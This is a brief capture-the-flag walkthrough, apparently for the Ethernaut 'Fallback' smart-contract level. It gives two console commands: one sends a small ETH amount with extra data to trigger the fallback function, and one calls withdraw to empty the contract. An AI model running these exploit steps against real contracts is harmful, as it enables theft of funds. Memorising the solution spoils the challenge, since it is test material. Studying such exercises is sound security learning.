#Fallback

We can force the fallback function by sending any non-zero amount of ETH and  
an additional function parameter.

> await contract.send(5, {value: toWei("0.0001")})

Then we call withdraw to empty the contract.

> await contract.withdraw()
